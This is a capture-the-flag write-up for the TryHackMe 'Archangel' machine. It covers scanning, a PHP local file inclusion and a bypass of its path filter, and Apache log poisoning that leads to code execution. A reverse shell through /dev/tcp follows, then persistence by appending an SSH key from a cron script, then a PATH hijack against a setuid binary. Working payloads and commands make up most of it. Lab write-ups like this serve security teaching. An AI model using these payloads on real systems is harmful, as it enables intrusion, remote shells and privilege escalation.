---
title: Archangel
published: 2025-08-21
description: CTF - "Boot2root, Web exploitation, Privilege escalation, LFI"
image: "./archangel.jpeg"
tags: [CTF, CTF_THM, CTF_THM - easy]
category: TryHackMe
draft: false
---
[THM](https://tryhackme.com/room/archangel)

# archangel.thm
## Notes from the page
* ![image](./Pasted%20image%2020251215151644.png)

## Nmap

```bash
`nmap -sC -sV -vv {TARGET_IP}`

#result
Scanned at 2025-12-15 13:59:36 -03 for 23s
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 9f1d2c9d6ca40e4640506fedcf1cf38c (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDPrwb4vLZ/CJqefgxZMUh3zsubjXMLrKYpP8Oy5jNSRaZynNICWMQNfcuLZ2GZbR84iEQJrNqCFcbsgD+4OPyy0TXV1biJExck3OlriDBn3g9trxh6qcHTBKoUMM3CnEJtuaZ1ZPmmebbRGyrG03jzIow+w2updsJ3C0nkUxdSQ7FaNxwYOZ5S3X5XdLw2RXu/o130fs6qmFYYTm2qii6Ilf5EkyffeYRc8SbPpZKoEpT7TQ08VYEICier9ND408kGERHinsVtBDkaCec3XmWXkFsOJUdW4BYVhrD3M8JBvL1kPmReOnx8Q7JX2JpGDenXNOjEBS3BIX2vjj17Qo3V
|   256 637327c76104256a08707a36b2f2840d (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKhhd/akQ2OLPa2ogtMy7V/GEqDyDz8IZZQ+266QEHke6vdC9papydu1wlbdtMVdOPx1S6zxA4CzyrcIwDQSiCg=
|   256 b64ed29c3785d67653e8c4e0481cae6c (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBE3FV9PrmRlGbT2XSUjGvDjlWoA/7nPoHjcCXLer12O
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Wavefire
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## GoBuster
(Using wordlist *DirBuster-2007_directory-list-2.3-medium.txt*)
* ![image](./Pasted%20image%2020251215145158.png)

I couldn't find anything that would lead me to the next step, so I tried to look at the "support" email, and why does it have a .thm?

 ### vim /etc/hosts
* ![image](./Pasted%20image%2020251215151742.png)
---
# mafialive.thm
## Notes from page
* ![image](./Pasted%20image%2020251215152633.png)
## GoBuster
(Using wordlist *common.txt*)
* gobuster dir -u http://mafialive.thm -w <pathToWordlist>![[Pasted image 20251215152957.png]]
## mafialive.thm/robots.txt

* `curl -s http://mafialive.thm/robots.txt`

```html
User-agent: *
Disallow: /test.php
```

## http://mafialive.thm/test.php
* ![image](./Pasted%20image%2020251215172721.png)

Hmmm, this part code is interesting: 
* `"?view/var/www/html/development_testing/mrrobot.php"`

```bash
curl -s http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/test.php
```
## /var/www/html/development_testing/test.php
```html
<!DOCTYPE HTML>  
<html>  
  
<head>  
   <title>INCLUDE</title>  
   <h1>Test Page. Not to be Deployed</h1>  
   
   </button></a> <a href="/test.php?view=/var/www/html/development_testing/mrrobot.php"><button id="secret">Here is a button</button>
</a><br>
       CQo8IURPQ1RZUEUgSFRNTD4KPGh0bWw+Cgo8aGVhZD4KICAgIDx0aXRsZT5JTkNMVURFPC90aXRsZT4KICAgIDxoMT5UZXN0IFBhZ2UuIE5vdCB0byBiZSBEZXBsb3  
llZDwvaDE+CiAKICAgIDwvYnV0dG9uPjwvYT4gPGEgaHJlZj0iL3Rlc3QucGhwP3ZpZXc9L3Zhci93d3cvaHRtbC9kZXZlbG9wbWVudF90ZXN0aW5nL21ycm9ib3QucGhwIj48  
YnV0dG9uIGlkPSJzZWNyZXQiPkhlcmUgaXMgYSBidXR0b248L2J1dHRvbj48L2E+PGJyPgogICAgICAgIDw/cGhwCgoJICAgIC8vRkxBRzogdGhte2V4cGxvMXQxbmdfbGYxfQ  
oKICAgICAgICAgICAgZnVuY3Rpb24gY29udGFpbnNTdHIoJHN0ciwgJHN1YnN0cikgewogICAgICAgICAgICAgICAgcmV0dXJuIHN0cnBvcygkc3RyLCAkc3Vic3RyKSAhPT0g  
ZmFsc2U7CiAgICAgICAgICAgIH0KCSAgICBpZihpc3NldCgkX0dFVFsidmlldyJdKSl7CgkgICAgaWYoIWNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICcuLi8uLicpICYmIG  
NvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICcvdmFyL3d3dy9odG1sL2RldmVsb3BtZW50X3Rlc3RpbmcnKSkgewogICAgICAgICAgICAJaW5jbHVkZSAkX0dFVFsndmlldydd  
OwogICAgICAgICAgICB9ZWxzZXsKCgkJZWNobyAnU29ycnksIFRoYXRzIG5vdCBhbGxvd2VkJzsKICAgICAgICAgICAgfQoJfQogICAgICAgID8+CiAgICA8L2Rpdj4KPC9ib2  
R5PgoKPC9odG1sPgoKCg==    </div>  
</body>  
  
</html>
```

```bash
echo "CQo8IURPQ1RZUEUgSFRNTD4KPGh0bWw+Cgo8aGVhZD4KICAgIDx0aXRsZT5JTkNMVURFPC90aXRsZT4KICAgIDxoMT5UZXN0IFBhZ2UuIE5vdCB0byBiZSBEZXBsb3llZDwvaDE+CiAKICAgIDwvYnV0dG9uPjwvYT4gPGEgaHJlZj0iL3Rlc3QucGhwP3ZpZXc9L3Zhci93d3cvaHRtbC9kZXZlbG9wbWVudF90ZXN0aW5nL21ycm9ib3QucGhwIj48YnV0dG9uIGlkPSJzZWNyZXQiPkhlcmUgaXMgYSBidXR0b248L2J1dHRvbj48L2E+PGJyPgogICAgICAgIDw/cGhwCgoJICAgIC8vRkxBRzogdGhte2V4cGxvMXQxbmdfbGYxfQoKICAgICAgICAgICAgZnVuY3Rpb24gY29udGFpbnNTdHIoJHN0ciwgJHN1YnN0cikgewogICAgICAgICAgICAgICAgcmV0dXJuIHN0cnBvcygkc3RyLCAkc3Vic3RyKSAhPT0gZmFsc2U7CiAgICAgICAgICAgIH0KCSAgICBpZihpc3NldCgkX0dFVFsidmlldyJdKSl7CgkgICAgaWYoIWNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICcuLi8uicpICYmIGNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICcvdmFyL3d3dy9odG1sL2RldmVsb3BtZW50X3Rlc3RpbmcnKSkgewogICAgICAgICAgICAJaW5jbHVkZSAkX0dFVFsndmlldyddOwogICAgICAgICAgICB9ZWxzZXsKCgkJZWNobyAnU29ycnksIFRoYXRzIG5vdCBhbGxvd2VkJzsKICAgICAgICAgICAgfQoJfQogICAgICAgID8+CiAgICA8L2Rpdj4KPC9ib2R5PgoKPC9odG1sPgoKCg==" | base64 -d
```

**Code:**
```html
<!DOCTYPE HTML>  
<html>  
  
<head>  
   <title>INCLUDE</title>  
   <h1>Test Page. Not to be Deployed</h1>  
   
   </button></a> <a href="/test.php?view=/var/www/html/development_testing/mrrobot.php"><button id="secret">Here is a button</button></a><br>  
       <?php  
  
           //FLAG: thm{explo1t1ng_lf1}  
  
           function containsStr($str, $substr) {  
               return strpos($str, $substr) !== false;  
           }  
           if(isset($_GET["view"])){  
           if(!containsStr($_GET['view'], '../..') && containsStr($_GET['view'], '/var/www/html/development_testing')) {  
               include $_GET['view'];  
           }else{  
  
               echo 'Sorry, Thats not allowed';  
           }  
       }  
       ?>  
   </div>  
</body>  
</html>
```
This code has an anti-LFI mechanism, but there is a way to bypass it.  
```bash
# Using
/.././.././../log/apache2/access.log
# instead of
/../../../log/apache2/access.log
```

## /var/www/html/development_testing/.././.././../log/apache2/access.log

```html 
<!DOCTYPE HTML>  
<html>  
  
<head>  
   <title>INCLUDE</title>  
   <h1>Test Page. Not to be Deployed</h1>  
   
   </button></a> <a href="/test.php?view=/var/www/html/development_testing/mrrobot.php"><button id="secret">Here is a button</button></a><br>  
          
192.168.166.197 - - [30/Dec/2025:01:30:36 +0530] "GET /test.php HTTP/1.1" 200 473 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:146.0) Gecko/20100101 Firefox/146.0"  
192.168.166.197 - - [30/Dec/2025:01:30:47 +0530] "GET /test.php?view=/var/www/html/development_testing/.././.././../log/apache2/access.log HTTP/1.1" 200 618 "-" "curl/7.88.1"  
192.168.166.197 - - [30/Dec/2025:01:31:08 +0530] "GET /test.php?view=/var/www/html/development_testing/../../../log/apache2/access.log HTTP/1.1" 200 482 "-" "curl/7.88.1"  
192.168.166.197 - - [30/Dec/2025:01:36:02 +0530] "GET /test.php?view=/var/www/html/development_testing/../../../log/apache2/access.log HTTP/1.1" 200 482 "-" "curl/7.88.1"  
   </div>  
</body>  
</html>
```

### poising cache
* `curl -A "<?php system($_GET['cmd']); ?>" http://mafialive.thm/test.php?view=/var/www/html/development_testing/.././.././../log/apache2/access.log`

```html
192.168.166.197 - - [30/Dec/2025:01:39:59 +0530] "GET /test.php?view=/var/www/html/development_testing/.././.././../log/apache2/access.log HTTP/1.1" 200 1312 "uid=33(www-data) gid=3  
3(www-data) groups=33(www-data)  
" "curl/7.88.1"  
   </div>  
</body>  
  
</html>
```
### RCE
Now, using:
**Terminal 1**
* `nc -nlvp 4444`

Go in url
`http://mafialive.thm/test.php?view=/var/www/html/development_testing/.././.././../log/apache2/access.log&cmd=bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/<YOURIP>/<LISTEN.PORT(4444)>%200%3E%261%22%20%26`

And if everything worked as expected, this is how your Terminal 1 should look now
```bash
www-data@ubuntu:/home$ cat archangel/user.txt  
cat archangel/user.txt  
thm{lf1_t0_rc3_1s_tr1cky}

www-data@ubuntu:/etc/cron.weekly$ cat /etc/crontab
cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
*/1 *   * * *   archangel /opt/helloworld.sh
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
```
**Modifying** *helloworld.sh* to add SSH keys to **authorized_keys**:
```bash
cat > helloworld.sh << 'EOF'  
#!/bin/bash  
mkdir -p /home/archangel/.ssh  
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCkCn42NOCaZymJdu14cQQ3a0QIGeBmOzBSl/eV/XnTYy/xGSO1TQnjqrEYeMP5TufrrhPzfJMXQTby+ijQzR1ep8hhlHM679dfytSSfR0jEbImAKkcVu5a3Zmkc9OxQedOTBb+ErxnyX/bgTY5/dhNxAHXQGa4r2Xrp1R9  
2h1pfBq3iDzvPcT0+P29H2flBipRSv7rGNpZ0537na9Wd2ZN1jgE8cH2TUht/3wzNpGOCJCyvpbtmujemMleZJIPZ7wWVSJ7/+sliOR1b0e//sfVg7VhwCfds9STW8LMJyJqgG/N0ELk7yIGlYyQaS4eU68GTk7oxvklXWwxRhXTt4fNQky5bQ34HyzZgyQ+UYj5lZWPuoZecLm+ab  
Pv/ge//J8nKbf3oru8gY3AwYsy/Q9ZV67bJJoG6XyNFH3qycChmPKKacfLo10+xk0lkbfQd7GMIzM/1Yxvlokf+qrS/YspYkt/F7Q9w1T2+/ae1lGwE3NQ7zSvWZy6OjujjBjQeWxJb3ar/CufxYBP9d/oh4ZAOBoJv2Ieh88FtAlUb7wg9lIp7xG1+7t7/kZoEboAj9nSJqHFRTOC  
UmZ0hGOZUNuhp4oUnHHCVyAwrvEvXdGADUskuXvzuU3j65AIqiLhwOER8QIcH3LGsehPJ38Ho6/NH6hCLx/fT6t3szUZRy2cLQ== user@user.com" >> /home/archangel/.ssh/authorized_keys  
EOF
```

* ssh -i ~/.ssh/id_rsa archangel@mafialive.thm

```bash
cd /home/archangel/secret

$ file backup  
backup: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter  
/lib64/ld-linux-x86-64.so.2, BuildID[sha1]=9093af828f30f957efce9020adc16dc214371d45, for GNU/Linux 3.2.  
0, not stripped

cat > cp << EOF
#!/bin/bash
/bin/bash -i
EOF

chmod +x cp
export PATH=/home/archangel/secret:$PATH
```